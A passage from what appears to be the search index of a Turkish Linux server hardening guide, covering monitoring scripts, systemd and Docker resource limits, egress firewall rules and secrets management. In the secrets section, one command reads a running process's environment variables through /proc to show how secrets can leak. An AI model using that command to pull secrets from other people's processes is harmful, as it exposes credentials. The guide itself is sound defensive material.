| awk '{printf \"%.0f\", $3/$2 * 100}')\nif [ \"$USAGE\" -gt \"$THRESHOLD\" ]; then\n    free -h | mail -s \"\u26a0\ufe0f Memory Alert: %$USAGE - $(hostname)\" admin@example.com\nfi\n</code></pre> <p>(Bunlar\u0131 da cron'a eklemeyi unutmay\u0131n!)</p>"},{"location":"security/monitoring/#5-alternatif-telegram-bildirimi","title":"5. Alternatif: Telegram Bildirimi \ud83d\udcf1","text":"<p>Mail ile u\u011fra\u015fmak istemiyorsan\u0131z Telegram Botu kullan\u0131n.</p> <pre><code># Telegram fonksiyonu (Scriptlerinizde mail komutu yerine bunu kullan\u0131n)\nsend_telegram() {\n    BOT_TOKEN=\"123456:ABC-xyz...\"\n    CHAT_ID=\"987654321\"\n    MESSAGE=\"$1\"\n\n    curl -s -X POST \"https://api.telegram.org/bot$BOT_TOKEN/sendMessage\" \\\n        -d chat_id=\"$CHAT_ID\" \\\n        -d text=\"$MESSAGE\" \\\n        -d parse_mode=\"HTML\" &gt; /dev/null\n}\n</code></pre>"},{"location":"security/monitoring/#6-log-rotation-loglarn-sismesini-onleme","title":"6. Log Rotation (Loglar\u0131n \u015ei\u015fmesini \u00d6nleme) \ud83d\udd04","text":"<p>Log dosyalar\u0131 diski doldurmas\u0131n diye rotasyon ekleyelim.</p> <p>Dosya: <code>/etc/logrotate.d/security-alerts</code></p> <pre><code>/var/log/cpu_alerts.log\n/var/log/network_alerts.log\n{\n    weekly\n    rotate 4\n    compress\n    missingok\n    notifempty\n}\n</code></pre>"},{"location":"security/monitoring/#7-hzl-durum-kontrol-scripti-security-status","title":"7. H\u0131zl\u0131 Durum Kontrol Scripti (Security Status) \ud83d\ude80","text":"<p>Tek komutla sunucunun genel sa\u011fl\u0131k ve g\u00fcvenlik rontgeni.</p> <p>Dosya: <code>/usr/local/bin/security_check.sh</code></p> <pre><code>#!/bin/bash\n# security_check.sh - Genel Bak\u0131\u015f\n\necho \"=== \ud83d\udee1\ufe0f  G\u00dcVENL\u0130K KONTROL\u00dc: $(date) ===\"\n\necho -e \"\\n[1] Bekleyen Kritik G\u00fcncellemeler:\"\napt list --upgradable 2&gt;/dev/null | grep -i security || echo \"Temiz.\"\n\necho -e \"\\n[2] Son Ba\u015far\u0131s\u0131z SSH Denemeleri:\"\ngrep \"Failed password\" /var/log/auth.log | tail -5 || echo \"Log bulunamad\u0131.\"\n\necho -e \"\\n[3] Root Olarak \u00c7al\u0131\u015fan Docker Konteynerleri:\"\nif command -v docker &amp;&gt; /dev/null; then\n    docker ps --quiet | xargs -I {} docker inspect {} --format '{{.Name}}: User={{.Config.User}}' | grep -E \"User=$|User=root\" || echo \"Yok (G\u00fcvenli).\"\nelse\n    echo \"Docker kurulu de\u011fil.\"\nfi\n\necho -e \"\\n[4] Y\u00fcksek CPU Kullanan S\u00fcre\u00e7ler:\"\nps aux --sort=-%cpu | head -5\n\necho -e \"\\n[5] En \u00c7ok Ba\u011flant\u0131 Kuran D\u0131\u015f IP'ler:\"\nss -tunap | grep ESTAB | awk '{print $6}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -5\n\necho -e \"\\n[6] Disk Kullan\u0131m\u0131:\"\ndf -h | grep -E '^/dev/' | awk '$5 &gt; 80 {print \"\u26a0\ufe0f \" $0}'\n\necho -e \"\\n[7] Zombie Process'ler:\"\nps aux | awk '$8 ~ /Z/ {print $0}' || echo \"Yok.\"\n\necho -e \"\\n[8] Kernel Bilgisi:\"\nuname -r\n\necho -e \"\\n=== KONTROL TAMAMLANDI ===\"\n</code></pre>"},{"location":"security/resource-limits/","title":"Kaynak S\u0131n\u0131rlama (Resource Limits) \ud83d\udcc9","text":"<p>Bir sald\u0131rgan sunucuya s\u0131zd\u0131\u011f\u0131nda (RCE), genellikle ilk i\u015fi sunucuyu Crypto Mining (Kripto Madencili\u011fi) veya DDoS Sald\u0131r\u0131s\u0131 i\u00e7in kullanmakt\u0131r. Bu durum CPU'yu %100'e kilitler ve sunucuyu sizin i\u00e7in kullan\u0131lmaz hale getirir.</p> <p>Bu rehberde, bir servis hacklense bile sistemin tamam\u0131n\u0131 kilitlemesini (Resource Exhaustion) nas\u0131l engelleyece\u011fimizi anlat\u0131yoruz.</p>"},{"location":"security/resource-limits/#1-systemd-ile-servisleri-kstlama-en-etkili-yontem","title":"1. Systemd ile Servisleri K\u0131s\u0131tlama (En Etkili Y\u00f6ntem) \ud83d\udee1\ufe0f","text":"<p>Linux'ta servisler genellikle <code>systemd</code> ile y\u00f6netilir. Systemd, her servisin ne kadar CPU ve RAM kullanaca\u011f\u0131n\u0131 \u00e7ok hassas bir \u015fekilde s\u0131n\u0131rlayabilir.</p>"},{"location":"security/resource-limits/#ornek-senaryo-web-uygulamas","title":"\u00d6rnek Senaryo: Web Uygulamas\u0131","text":"<p>Diyelim ki <code>myapp.service</code> ad\u0131nda bir uygulaman\u0131z var.</p> <p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo systemctl edit myapp.service --full\n</code></pre> <p><code>[Service]</code> blo\u011funun alt\u0131na \u015fu s\u0131n\u0131rlar\u0131 ekleyin:</p> <pre><code>[Service]\n# ... di\u011fer ayarlar ...\n\n# CPU K\u0131s\u0131tlama: %80 (Tek \u00e7ekirde\u011fin %80'i)\n# E\u011fer 2 \u00e7ekirdekli sunucuda max 1 \u00e7ekirdek kullans\u0131n derseniz %100,\n# toplam\u0131n yar\u0131s\u0131 olsun derseniz %100 (200 \u00fczerinden) ayar\u0131 de\u011fi\u015fir.\n# En garantisi tek \u00e7ekirdek %80 limiti koymakt\u0131r.\nCPUQuota=80%\n\n# RAM K\u0131s\u0131tlama: 1GB'a ula\u015f\u0131rsa s\u00fcre\u00e7 OOM Killer taraf\u0131ndan \u00f6ld\u00fcr\u00fcl\u00fcr.\nMemoryMax=1G\n# RAM dolmaya yakla\u015f\u0131nca swap kullanmas\u0131n, direkt engellesin (Opsiyonel)\nMemorySwapMax=0\n\n# Fork Bomb Korumas\u0131: Ayn\u0131 anda max 100 alt i\u015flem a\u00e7abilsin.\nTasksMax=100\n</code></pre> <p>Ayarlar\u0131 uygulay\u0131n:</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl restart myapp\n</code></pre> <p>Mant\u0131k: Sald\u0131rgan i\u00e7eri girip Mining ba\u015flatsa bile, CPU kullan\u0131m\u0131 %80'i (veya belirledi\u011finiz s\u0131n\u0131r\u0131) ge\u00e7emez. Sunucu nefes almaya devam eder, SSH ile ba\u011flan\u0131p m\u00fcdahale edebilirsiniz.</p>"},{"location":"security/resource-limits/#2-limitsconf-kullanc-bazl-snrlar","title":"2. Limits.conf (Kullan\u0131c\u0131 Bazl\u0131 S\u0131n\u0131rlar) \ud83d\udc64","text":"<p>Systemd kullanmayan scriptler veya kullan\u0131c\u0131 oturumlar\u0131 i\u00e7in <code>/etc/security/limits.conf</code> dosyas\u0131 kullan\u0131l\u0131r.</p> <p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/security/limits.conf\n</code></pre> <p>En alta \u015fu sat\u0131rlar\u0131 ekleyerek bir kullan\u0131c\u0131n\u0131n veya grubun sunucuyu kilitlemesini \u00f6nleyebilirsiniz:</p> <pre><code># &lt;domain&gt;      &lt;type&gt;  &lt;item&gt;         &lt;value&gt;\n\n# 'deploy' kullan\u0131c\u0131s\u0131 max 2GB RAM kullanabilsin\ndeploy          hard    as             2000000\n\n# 'deploy' kullan\u0131c\u0131s\u0131 max 50 i\u015flem a\u00e7abilsin (Fork Bomb \u00f6nleme)\ndeploy          hard    nproc          50\n\n# A\u00e7\u0131k dosya say\u0131s\u0131 limiti (Too many open files hatas\u0131 \u00f6nlemi)\ndeploy          soft    nofile         4096\ndeploy          hard    nofile         8192\n</code></pre> <p>Not: Bu ayarlar kullan\u0131c\u0131 yeniden giri\u015f yapt\u0131\u011f\u0131nda (Login) aktif olur.</p>"},{"location":"security/resource-limits/#3-acil-durumda-cpu-frenleme-cpulimit","title":"3. Acil Durumda CPU Frenleme (<code>cpulimit</code>) \ud83d\ude91","text":"<p>E\u011fer halihaz\u0131rda \u00e7al\u0131\u015fan ve kontrolden \u00e7\u0131km\u0131\u015f bir s\u00fcre\u00e7 varsa, onu \u00f6ld\u00fcrmeden yava\u015flatmak i\u00e7in <code>cpulimit</code> arac\u0131 kullan\u0131labilir.</p> <p>Kurulum:</p> <pre><code>sudo apt install cpulimit\n</code></pre> <p>Kullan\u0131m (PID ile):</p> <pre><code># 1234 ID'li s\u00fcreci %50 CPU'ya sabitle\nsudo cpulimit -p 1234 -l 50\n</code></pre> <p>Kullan\u0131m (\u0130sim ile):</p> <pre><code># Ad\u0131 'python3' olan s\u00fcreci %30'a sabitle\nsudo cpulimit -e python3 -l 30\n</code></pre>"},{"location":"security/resource-limits/#4-giden-trafik-egress-kstlamas","title":"4. Giden Trafik (Egress) K\u0131s\u0131tlamas\u0131 \ud83d\udea7","text":"<p>Sald\u0131rgan\u0131n sunucunuz \u00fczerinden ba\u015fkalar\u0131na DDoS yapmas\u0131n\u0131 engellemek i\u00e7in Firewall \u00c7\u0131k\u0131\u015f Kurallar\u0131 \u015fartt\u0131r.</p> <p>Bu konuyu Firewall Rehberi i\u00e7erisinde detayland\u0131rd\u0131k. Mutlaka <code>ufw default deny outgoing</code> politikas\u0131n\u0131 uygulay\u0131n!</p> <p>K\u0131ssadan Hisse:</p> <ol> <li>Systemd ile CPUQuota koyun (Mining engeller).</li> <li>UFW ile Outgoing Deny yap\u0131n (DDoS engeller).</li> <li><code>/tmp</code> noexec yap\u0131n (Script indirmeyi zorla\u015ft\u0131r\u0131r).</li> <li>Otomatik G\u00fcncellemeleri a\u00e7\u0131n (RCE a\u00e7\u0131\u011f\u0131n\u0131 kapat\u0131r).</li> </ol>"},{"location":"security/resource-limits/#5-sistem-geneli-radikal-onlem-cgroups","title":"5. Sistem Geneli Radikal \u00d6nlem (Cgroups) \u26a1","text":"<p>E\u011fer \"Hangi kullan\u0131c\u0131 ne yap\u0131yor umurumda de\u011fil, kimse CPU'yu s\u00f6m\u00fcremezsin\" diyorsan\u0131z, t\u00fcm kullan\u0131c\u0131 oturumlar\u0131na (User Slice) global limit koyabilirsiniz.</p> <p>Dosyay\u0131 olu\u015fturun:</p> <pre><code>sudo mkdir -p /etc/systemd/system/user-.slice.d/\nsudo nano /etc/systemd/system/user-.slice.d/50-limit.conf\n</code></pre> <p>\u0130\u00e7erik:</p> <pre><code>[Slice]\n# Hi\u00e7bir kullan\u0131c\u0131 (root dahil SSH oturumlar\u0131) CPU'nun %80'inden fazlas\u0131n\u0131 kullanamaz\nCPUQuota=80%\n# RAM'in %80'inden fazlas\u0131n\u0131 kullanamaz\nMemoryMax=80%\n</code></pre> <p>Uygula:</p> <pre><code>sudo systemctl daemon-reload\n</code></pre>"},{"location":"security/resource-limits/#6-docker-konteyner-limitleri","title":"6. Docker Konteyner Limitleri \ud83d\udc33","text":"<p>Mining vir\u00fcsleri en kolay Docker konteynerlerine bula\u015f\u0131r. E\u011fer limit koymazsan\u0131z t\u00fcm sunucuyu kilitlerler.</p>"},{"location":"security/resource-limits/#docker-run-ile","title":"Docker Run ile","text":"<pre><code>docker run -d \\\n  --cpus=\"0.5\" \\        # Yar\u0131m \u00e7ekirdek\n  --memory=\"512m\" \\     # 512MB RAM\n  --pids-limit=100 \\    # Fork bomb korumas\u0131\n  my-app\n</code></pre>"},{"location":"security/resource-limits/#docker-compose-ile-onerilen","title":"Docker Compose ile (\u00d6nerilen)","text":"<pre><code>services:\n  app:\n    image: my-app\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.50\"\n          memory: 512M\n        reservations:\n          cpus: \"0.25\"\n          memory: 256M\n</code></pre>"},{"location":"security/resource-limits/#7-ozet-saldr-zincirini-krma","title":"7. \u00d6zet: Sald\u0131r\u0131 Zincirini K\u0131rma \ud83d\udd17","text":"<p>Ya\u015fad\u0131\u011f\u0131n\u0131z RCE (Remote Code Execution) sald\u0131r\u0131s\u0131n\u0131 durdurmak i\u00e7in zincirin halkalar\u0131n\u0131 \u015f\u00f6yle k\u0131rd\u0131k:</p> Sald\u0131r\u0131 Ad\u0131m\u0131 Bizim \u00d6nlemimiz Sonu\u00e7 1. Giri\u015f (React RCE) Otomatik G\u00fcncelleme A\u00e7\u0131k kapan\u0131r, giremez. 2. Yay\u0131lma (Container Root) User NS / Non-Root (Sonraki ad\u0131mda Docker g\u00fcvenli\u011finde i\u015fleyece\u011fiz). 3. Kaynak T\u00fcketimi (Mining) Resource Limits CPU %100 olamaz, sunucu kilitlenmez. 4. D\u0131\u015far\u0131 Sald\u0131r\u0131 (DDoS) UFW Outbound Deny D\u0131\u015far\u0131 veri/paket g\u00f6nderemez. 5. Gizlenme Monitoring Scripts <code>cpu_alert</code> ile an\u0131nda yakalar\u0131z."},{"location":"security/resource-limits/#acil-yaplacaklar-listesi","title":"\ud83d\udccb Acil Yap\u0131lacaklar Listesi","text":"<p>Sald\u0131r\u0131 alt\u0131ndaysan\u0131z veya hemen \u00f6nlem almak istiyorsan\u0131z:</p> <pre><code># 1. Hemen ve \u015fimdi g\u00fcncelle!\nsudo apt update &amp;&amp; sudo apt upgrade -y\n\n# 2. Otomatik g\u00fcncellemeleri a\u00e7 (Unattended)\nsudo apt install unattended-upgrades -y\nsudo dpkg-reconfigure -plow unattended-upgrades\n\n# 3. Egress Firewall'\u0131 aktifle\u015ftir (Dikkatli ol, SSH kopmas\u0131n!)\nsudo ufw default deny outgoing\nsudo ufw allow out 80/tcp\nsudo ufw allow out 443/tcp\nsudo ufw allow out 53\n\n# 4. Mevcut sistemi tara (Sald\u0131rgan izi var m\u0131?)\nsudo lynis audit system\n</code></pre>"},{"location":"security/secrets/","title":"Secret Y\u00f6netimi (\u015eifre Saklama) \ud83d\udd11","text":"<p>Uygulamalar\u0131n\u0131z\u0131n i\u00e7inde veritaban\u0131 \u015fifresi, API anahtar\u0131 veya Secret Key gibi hassas verileri ASLA kodun i\u00e7ine (Hardcoded) yazmamal\u0131s\u0131n\u0131z. Kodunuzu GitHub'a att\u0131\u011f\u0131n\u0131z an o \u015fifreler if\u015fa olur.</p> <p>\u0130\u015fte bu \u015fifreleri g\u00fcvenli bir \u015fekilde y\u00f6netmenin yollar\u0131.</p>"},{"location":"security/secrets/#1-yontem-env-dosyas-en-pratik","title":"1. Y\u00f6ntem: <code>.env</code> Dosyas\u0131 (En Pratik) \u2705","text":"<p>\u00c7o\u011fu proje (Node.js, Python, PHP, Docker) i\u00e7in standart y\u00f6ntem budur. \u015eifreler proje klas\u00f6r\u00fcnde <code>.env</code> ad\u0131nda gizli bir dosyada tutulur.</p>"},{"location":"security/secrets/#nasl-yaplr","title":"Nas\u0131l Yap\u0131l\u0131r?","text":"<ol> <li> <p>Proje dizininde <code>.env</code> dosyas\u0131n\u0131 olu\u015fturun:</p> <pre><code>nano .env\n</code></pre> </li> <li> <p>\u0130\u00e7ine hassas verilerinizi yaz\u0131n:</p> <pre><code>DB_HOST=localhost\nDB_USER=admin\nDB_PASSWORD=cok_gizli_sifre_burada\nJWT_SECRET=ozel_uretilen_hash_degeri\nAPI_KEY=x8s7ad7sa8d7s8d7a8s\n</code></pre> </li> </ol>"},{"location":"security/secrets/#guvenli-hale-getirme-cok-onemli","title":"G\u00fcvenli Hale Getirme (\u00c7ok \u00d6nemli!) \ud83d\udee1\ufe0f","text":"<p>Bu dosyan\u0131n sadece sizin taraf\u0131n\u0131zdan okunabilmesi laz\u0131m. Di\u011fer kullan\u0131c\u0131lar okuyamas\u0131n.</p> <pre><code># Sadece sahibi okuyup yazabilsin (600)\nchmod 600 .env\n\n# Sahipli\u011fini garantiye al\nsudo chown $USER:$USER .env\n</code></pre>"},{"location":"security/secrets/#gitten-uzak-tutma","title":"Git'ten Uzak Tutma \ud83d\udeab","text":"<p>Bu dosyan\u0131n yanl\u0131\u015fl\u0131kla GitHub'a gitmemesi i\u00e7in <code>.gitignore</code> dosyas\u0131na ekleyin:</p> <pre><code>echo \".env\" &gt;&gt; .gitignore\n</code></pre>"},{"location":"security/secrets/#2-yontem-docker-secrets-konteynerler-icin","title":"2. Y\u00f6ntem: Docker Secrets (Konteynerler \u0130\u00e7in) \ud83d\udc33","text":"<p>E\u011fer Docker Compose kullan\u0131yorsan\u0131z, \u015fifreleri \u00e7evre de\u011fi\u015fkeni (Environment Variable) yerine dosya olarak mount etmek daha g\u00fcvenlidir.</p> <p>docker-compose.yml \u00f6rne\u011fi:</p> <pre><code>services:\n  app:\n    image: my-app\n    secrets:\n      - db_password\n      - api_token\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n  api_token:\n    file: ./secrets/api_token.txt\n</code></pre> <p>Bu y\u00f6ntemde \u015fifreler konteynerin i\u00e7ine <code>/run/secrets/db_password</code> dosyas\u0131 olarak salt okunur (read-only) ba\u011flan\u0131r. Uygulaman\u0131z \u015fifreyi bu dosyadan okur.</p>"},{"location":"security/secrets/#3-guclu-sifre-uretme-araclar","title":"3. G\u00fc\u00e7l\u00fc \u015eifre \u00dcretme Ara\u00e7lar\u0131 \ud83c\udfb2","text":"<p>\"Ali123\" gibi \u015fifreler kullanmay\u0131n. Terminalden kriptografik olarak g\u00fcvenli rastgele \u015fifreler \u00fcretin.</p>"},{"location":"security/secrets/#openssl-ile-onerilen","title":"OpenSSL ile (\u00d6nerilen)","text":"<pre><code># 32 karakterlik base64 \u015fifre (JWT Secret i\u00e7in ideal)\nopenssl rand -base64 32\n# \u00c7\u0131kt\u0131: K7xP9mN2vQ8wR4tY6uI0oL3jH5gF1dS7aZ9xC2bV4nM=\n</code></pre>"},{"location":"security/secrets/#coklu-uretim","title":"\u00c7oklu \u00dcretim","text":"<pre><code># 5 tane \u00fcret\nfor i in {1..5}; do openssl rand -base64 24; done\n</code></pre>"},{"location":"security/secrets/#4-neden-hashicorp-vault-degil","title":"4. Neden HashiCorp Vault De\u011fil? \ud83e\udd14","text":"<p>HashiCorp Vault veya AWS Secrets Manager gibi ara\u00e7lar \u00e7ok g\u00fc\u00e7l\u00fcd\u00fcr ancak kurulumu ve bak\u0131m\u0131 zordur (\"Overkill\").</p> Y\u00f6ntem Karma\u015f\u0131kl\u0131k G\u00fcvenlik Uygun Senaryo Hardcoded \u00c7ok D\u00fc\u015f\u00fck \u274c Yok Asla kullanma .env Dosyas\u0131 D\u00fc\u015f\u00fck \u2705 \u0130yi Tek sunucu, k\u00fc\u00e7\u00fck/orta proje Docker Secrets Orta \u2705\u2705 \u00c7ok \u0130yi Docker Swarm / Kubernetes HashiCorp Vault \u00c7ok Y\u00fcksek \ud83c\udfc6 M\u00fckemmel Bankalar, Dev Kurumsal Yap\u0131lar <p>\u00d6zet: Tek bir sunucu veya startup projesi i\u00e7in <code>.env</code> + <code>chmod 600</code> fazlas\u0131yla yeterlidir.</p>"},{"location":"security/secrets/#5-ekip-calsmas-ve-ortamlar","title":"5. Ekip \u00c7al\u0131\u015fmas\u0131 ve Ortamlar \ud83e\udd1d","text":"<p>Projede yaln\u0131z de\u011filseniz veya farkl\u0131 sunucular (Test, Prod) y\u00f6netiyorsan\u0131z:</p>"},{"location":"security/secrets/#envexample-olusturun","title":"\ud83d\udcdd .env.example Olu\u015fturun","text":"<p>Ger\u00e7ek \u015fifrelerin olmad\u0131\u011f\u0131 bir \u015fablon dosyas\u0131 olu\u015fturun ve Git'e g\u00f6nderin. Yeni gelen geli\u015ftirici neye ihtiyac\u0131 oldu\u011funu anlas\u0131n.</p> <pre><code># .env.example (Git'e eklenir - \u0130\u00c7\u0130 BO\u015e OLSUN!)\nDB_HOST=localhost\nDB_USER=root\nDB_PASSWORD=\nJWT_SECRET=\nAPI_KEY=\n</code></pre> <p>Kullan\u0131m:</p> <pre><code>cp .env.example .env\nnano .env  # Kendi \u015fifrelerini yazar\n</code></pre>"},{"location":"security/secrets/#ortamlar-ayrn","title":"\ud83c\udf0d Ortamlar\u0131 Ay\u0131r\u0131n","text":"<ul> <li><code>.env.development</code> (Lokal - Git'e girmez)</li> <li><code>.env.production</code> (Canl\u0131 Sunucu - Git'e girmez, \u00c7ok g\u00fcvenli!)</li> <li><code>.gitignore</code> ayar\u0131:   <pre><code>echo -e \".env\\n.env.*\\n!.env.example\" &gt;&gt; .gitignore\n</code></pre></li> </ul>"},{"location":"security/secrets/#6-kritik-hata-sifreyi-yanlslkla-gite-attm","title":"6. Kritik Hata: \u015eifreyi Yanl\u0131\u015fl\u0131kla Git'e Att\u0131m! \ud83d\udea8","text":"<p>Sadece dosyay\u0131 silip yeni commit atmak YETMEZ! Git ge\u00e7mi\u015finde o \u015fifre sonsuza kadar saklan\u0131r.</p> <p>Ad\u0131m 1: \u015eifreyi hemen de\u011fi\u015ftirin (En garanti \u00e7\u00f6z\u00fcm budur).</p> <p>Ad\u0131m 2: Git Ge\u00e7mi\u015fini Temizleyin (Opsiyonel ama \u00f6nerilir)</p> <p>E\u011fer history temizlemek zorundaysan\u0131z <code>BFG Repo-Cleaner</code> kullan\u0131n:</p> <pre><code># .env dosyas\u0131n\u0131 tarihten sil\nbfg --delete-files .env\n\n# Git referanslar\u0131n\u0131 temizle ve zorla g\u00f6nder\ngit reflog expire --expire=now --all\ngit gc --prune=now --aggressive\ngit push --force\n</code></pre>"},{"location":"security/secrets/#7-ileri-seviye-guvenlik-riskleri","title":"7. \u0130leri Seviye G\u00fcvenlik Riskleri \ud83d\udd75\ufe0f\u200d\u2642\ufe0f","text":""},{"location":"security/secrets/#loglara-sifre-yazma-hatas","title":"\ud83d\udccb Loglara \u015eifre Yazma Hatas\u0131","text":"<p>Kod yazarken dikkatli olun. \u015eifreyi loglamay\u0131n!</p> <pre><code># \u274c YANLI\u015e: \u015eifre log dosyas\u0131na a\u00e7\u0131k metin yaz\u0131l\u0131r\nlogger.info(f\"Ba\u011flan\u0131l\u0131yor: {DB_USER}:{DB_PASSWORD}\")\n\n# \u2705 DO\u011eRU: Maskeleme yap\u0131n\nlogger.info(f\"Ba\u011flan\u0131l\u0131yor: {DB_USER}:****\")\n</code></pre>"},{"location":"security/secrets/#systemd-servislerinde-sifre","title":"\ud83d\udd0d Systemd Servislerinde \u015eifre","text":"<p>Servis dosyas\u0131n\u0131n i\u00e7ine (<code>Environment=\u015e\u0130FRE</code>) yazmay\u0131n. <code>ps aux</code> komutunda g\u00f6r\u00fcnebilir. Bunun yerine dosya kullan\u0131n:</p> <pre><code># /etc/systemd/system/myapp.service\n[Service]\nEnvironmentFile=/etc/myapp/env\nUser=appuser\n</code></pre> <p>Ve dosya izinlerini k\u0131s\u0131tlay\u0131n:</p> <pre><code>sudo chown root:root /etc/myapp/env\nsudo chmod 600 /etc/myapp/env\n</code></pre>"},{"location":"security/secrets/#8-ekstra-ipuclar-opsiyonel","title":"8. Ekstra \u0130pu\u00e7lar\u0131 (Opsiyonel) \ud83d\udca1","text":""},{"location":"security/secrets/#sifre-rotasyonu","title":"\ud83d\udd04 \u015eifre Rotasyonu","text":"<p>Kritik \u015fifreleri sonsuza kadar kullanmay\u0131n. Belirli aral\u0131klarla de\u011fi\u015ftirin:</p> <ul> <li>API Key: 90 G\u00fcnde bir.</li> <li>Veritaban\u0131 \u015eifresi: 6 Ayda bir.</li> <li>JWT Secret: Y\u0131lda bir (Dikkat: De\u011fi\u015fince kullan\u0131c\u0131lar\u0131n oturumu d\u00fc\u015fer).</li> </ul>"},{"location":"security/secrets/#process-environment-riski-ileri-seviye","title":"\ud83d\udd0d Process Environment Riski (\u0130leri Seviye)","text":"<p>Ayn\u0131 kullan\u0131c\u0131 ad\u0131yla \u00e7al\u0131\u015fan i\u015flemler, birbirlerinin \u00e7evre de\u011fi\u015fkenlerini (env) okuyabilir.</p> <pre><code># Bir process'in env de\u011ferlerini okuma:\ncat /proc/&lt;PID&gt;/environ | tr '\\0' '\\n'\n</code></pre> <p>\u00c7\u00f6z\u00fcm: Uygulamay\u0131 her zaman kendine ait bir kullan\u0131c\u0131 (\u00f6rn: <code>appuser</code>) ile \u00e7al\u0131\u015ft\u0131r\u0131n.</p>"},{"location":"security/secrets/#8-piyasadaki-diger-alternatifler-gelismis-senaryolar","title":"8. Piyasadaki Di\u011fer Alternatifler (Geli\u015fmi\u015f Senaryolar) \ud83c\udf0d","text":"<p>E\u011fer projeniz b\u00fcy\u00fcrse veya <code>env</code> dosyas\u0131yla u\u011fra\u015fmak istemezseniz, \u015fu ara\u00e7lara bakabilirsiniz:</p> Ara\u00e7 T\u00fcr \u00d6zellik Kullan\u0131m \u00d6nerisi HashiCorp Vault \ud83c\udfe2 Enterprise End\u00fcstri standard\u0131. \u00c7ok karma\u015f\u0131k ama her \u015feyi yapar. B\u00fcy\u00fck bankalar, Dev \u015firketler. Infisical \ud83d\ude80 Startup Dostu A\u00e7\u0131k kaynakl\u0131, Vault'un \u00e7ok daha kolay hali. Modern Yaz\u0131l\u0131m Ekipleri (\u015eiddetle \u00d6nerilir). Bitwarden Secrets \ud83d\udd13 A\u00e7\u0131k Kaynak Parola y\u00f6neticisi Bitwarden'\u0131n DevOps versiyonu. G\u00fcvenilir. Ki\u015fisel / K\u00fc\u00e7\u00fck Ekipler. AWS / Google Secrets \u2601\ufe0f Cloud Native Bulut sa\u011flay\u0131c\u0131n\u0131z\u0131n kendi servisi. Pahal\u0131 olabilir. Full AWS/GCP \u00fczerindeki projeler. Yandex Lockbox \ud83c\uddf7\ud83c\uddfa Rusya Men\u015feli Yandex Cloud'un servisi. HashiCorp alternatifi. Yandex Cloud kullananlar. (Not: Veri gizlili\u011fi endi\u015fesi olabilir) <p>\ud83d\udca1 Tavsiye: E\u011fer <code>.env</code> yetmiyor ama Vault \u00e7ok a\u011f\u0131r geliyorsa, Infisical veya Bitwarden'a g\u00f6z at\u0131n. Hem g\u00fcvenli hem pratiklerdir.</p>"},{"location":"security/service-glossary/","title":"Linux Servis S\u00f6zl\u00fc\u011f\u00fc","text":"<p>Bu d\u00f6k\u00fcman, <code>systemctl list-units</code> komutunu \u00e7al\u0131\u015ft\u0131rd\u0131\u011f\u0131n\u0131zda kar\u015f\u0131n\u0131za \u00e7\u0131kabilecek servislerin anlamlar\u0131n\u0131 ve \"Silinmeli mi?\" sorusunun cevab\u0131n\u0131 i\u00e7erir. Listenizdeki servisleri burada aratarak (Ctrl+F) ne i\u015fe yarad\u0131\u011f\u0131n\u0131 \u00f6\u011frenebilirsiniz.</p>"},{"location":"security/service-glossary/#1-bulut-ve-yonetim-ajanlar-cloud-agents","title":"1. Bulut ve Y\u00f6netim Ajanlar\u0131 (Cloud &amp; Agents)","text":"<p>Bulut sa\u011flay\u0131c\u0131lar\u0131n (Oracle, AWS, GCP) sunucuyu y\u00f6netmek i\u00e7in y\u00fckledi\u011fi servislerdir.</p> Servis Ad\u0131 A\u00e7\u0131klama Karar <code>cloud-init</code> Sunucunun ilk a\u00e7\u0131l\u0131\u015f\u0131nda IP, Hostname ve SSH anahtarlar\u0131n\u0131 ayarlar. \u26d4\ufe0f ASLA S\u0130LME <code>oracle-cloud-agent</code> Oracle Cloud y\u00f6netim paneli ile ileti\u015fim kurar (Reboot, Stop \u00f6zellikleri i\u00e7in). \u26d4\ufe0f DOKUNMA <code>unified-monitoring-agent</code> Oracle i\u00e7in log ve metrik toplar. \u2705 \u0130ste\u011fe Ba\u011fl\u0131 (Kals\u0131n) <code>amazon-ssm-agent</code> AWS Systems Manager. Konsol \u00fczerinden terminale (Session Manager) ba\u011flanmay\u0131 sa\u011flar. \u26d4\ufe0f DOKUNMA (AWS) <code>google-guest-agent</code> GCP a\u011f ve metadata y\u00f6netimi. SSH anahtarlar\u0131n\u0131 y\u00f6netir. \u26d4\ufe0f DOKUNMA (GCP) <code>aliyun-service</code> Alibaba Cloud y\u00f6netim ajan\u0131. \u26d4\ufe0f DOKUNMA (Alibaba) <code>waagent</code> Azure Linux Agent. \u26d4\ufe0f DOKUNMA (Azure)"},{"location":"security/service-glossary/#2-sistem-cekirdegi-system-core","title":"2. Sistem \u00c7ekirde\u011fi (System Core)","text":"<p>Linux'un \u00e7al\u0131\u015fmas\u0131 i\u00e7in gerekli temel par\u00e7alar.</p> Servis Ad\u0131 A\u00e7\u0131klama Karar <code>dbus</code> Programlar\u0131n birbiriyle konu\u015fmas\u0131n\u0131 sa\u011flayan mesajla\u015fma sistemi. \u26d4\ufe0f ASLA S\u0130LME <code>systemd-journald</code> Log tutma servisi (System logs). \u26d4\ufe0f ASLA S\u0130LME <code>systemd-logind</code> Kullan\u0131c\u0131 giri\u015flerini y\u00f6netir. \u26d4\ufe0f ASLA S\u0130LME <code>systemd-udevd</code> Donan\u0131m ayg\u0131tlar\u0131n\u0131 y\u00f6netir (<code>/dev</code> alt\u0131ndakiler). \u26d4\ufe0f ASLA S\u0130LME <code>polkit</code> Yetkilendirme y\u00f6neticisi (sudo benzeri ama GUI/servisler i\u00e7in). \u26a0\ufe0f Genelde Kals\u0131n (Agresif silinebilir) <code>cron</code> / <code>atd</code> Zamanlanm\u0131\u015f g\u00f6revler. \u2705 Kals\u0131n <code>getty@tty1</code> Fiziksel/VNC konsol giri\u015f ekran\u0131. \u2705 Kals\u0131n <code>serial-getty@...</code> Seri port konsol. ARM sunucularda (Oracle Ampere) hayati \u00f6nem ta\u015f\u0131r. \u26d4\ufe0f DOKUNMA (ARM)"},{"location":"security/service-glossary/#3-ag-servisleri-network","title":"3. A\u011f Servisleri (Network)","text":"<p>Sunucunun internete \u00e7\u0131kmas\u0131n\u0131 sa\u011flayan servisler.</p> Servis Ad\u0131 A\u00e7\u0131klama Karar <code>ssh</code> / <code>sshd</code> Sunucuya uzaktan ba\u011flanman\u0131z\u0131 sa\u011flar. \u26d4\ufe0f 